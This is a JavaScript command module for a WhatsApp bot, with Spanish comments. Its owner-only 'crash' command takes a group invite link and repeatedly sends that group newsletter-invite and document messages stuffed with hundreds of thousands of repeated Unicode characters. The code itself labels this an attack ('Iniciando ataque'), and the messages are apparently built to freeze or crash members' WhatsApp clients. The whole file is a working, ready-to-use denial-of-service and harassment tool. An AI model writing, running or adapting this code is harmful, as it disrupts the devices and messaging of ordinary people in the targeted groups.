import { join as joinPath } from 'path';

export default {
    command: ['crash'],
    category: 'owner',
    owner: true,

    run: async (sock, m, { prefix, isOwner, text }) => {
        if (!isOwner) {
            return m.reply('Solo el propietario puede usar este comando.');
        }

        // Extraer cantidad de mensajes y enlace del grupo
        const args = text.split(' ');
        let total = 200; // Valor por defecto
        
        // Verificar si se especificó una cantidad
        if (args.length > 1 && !isNaN(args[0])) {
            total = parseInt(args[0]);
            text = args.slice(1).join(' ');
        }

        if (!text || !text.includes('whatsapp.com')) {
            return sock.sendMessage(m.chat, { 
                text: `😿 Debes proporcionar el enlace del grupo.\nEjemplo: ${prefix}crash 100 https://chat.whatsapp.com/XXXX` 
            }, { quoted: m });
        }

        const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
        if (!match) return sock.sendMessage(m.chat, { text: '😡 Enlace inválido.' }, { quoted: m });

        const inviteCode = match[1];
        let groupId;

        try {
            const res = await sock.groupGetInviteInfo(inviteCode);
            groupId = res.id;
        } catch (e) {
            return sock.sendMessage(m.chat, { 
                text: "⚠️ No se pudo obtener el ID del grupo. Verifica que el enlace sea válido o que el grupo exista." 
            }, { quoted: m });
        }

        const canalKillGrupo = async () => {
            const basura = 'ꦾ'.repeat(90000);
            await sock.relayMessage(groupId, {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363229729656123@newsletter",
                    newsletterName: "TIBURON" + basura.repeat(3),
                    jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                    caption: "ElSKSMMS",
                    inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
                }
            }, {});
        };

        const docKillGrupo = async (i) => {
            const traba = 'ꦾ'.repeat(90000);
            const contenido = '\u200E'.repeat(5000) + i;
            await sock.sendMessage(groupId, {
                document: Buffer.from(contenido),
                fileName: `TOPIC 🔥_${i + 1}`.repeat(2),
                mimetype: 'application/msword',
                caption: traba.repeat(3)
            });
        };

        const canalGato = async () => {
            const basura = '𑇂𑆵𑆴𑆿'.repeat(75000);
            await sock.relayMessage(groupId, {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363229729656123@newsletter",
                    newsletterName: "🔥👾🔥👾" + basura.repeat(3),
                    jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                    caption: "TOOOPPICCCCC",
                    inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
                }
            }, {});
        };

        const docGato = async (i) => {
            const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
            const contenido = '\u200E'.repeat(5000) + i;
            await sock.sendMessage(groupId, {
                document: Buffer.from(contenido),
                fileName: `🔥 TOPIC 🔥_${i + 1}`.repeat(2),
                mimetype: 'application/msword',
                caption: traba.repeat(3)
            });
        };

        m.reply(`✅ Iniciando ataque al grupo: ${groupId}\nCantidad de mensajes: ${total}`);

        const delayMs = 9000;
        const ciclos = Math.floor(total / 4);

        for (let i = 0; i < ciclos; i++) {
            await canalKillGrupo();
            await new Promise(r => setTimeout(r, delayMs));

            await docKillGrupo(i);    
            await new Promise(r => setTimeout(r, delayMs));    

            await canalGato();    
            await new Promise(r => setTimeout(r, delayMs));    

            await docGato(i);    
            await new Promise(r => setTimeout(r, delayMs));
        }

        const restantes = total % 4;
        const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
        for (let i = 0; i < restantes; i++) {
            await extra[i]();
            await new Promise(r => setTimeout(r, delayMs));
        }

        await sock.sendMessage(m.chat, { 
            text: `✅ ${total} mensajes enviados al grupo ${groupId} en aproximadamente ${Math.ceil(total * 9 / 60)} minutos.` 
        }, { quoted: m });
    }
};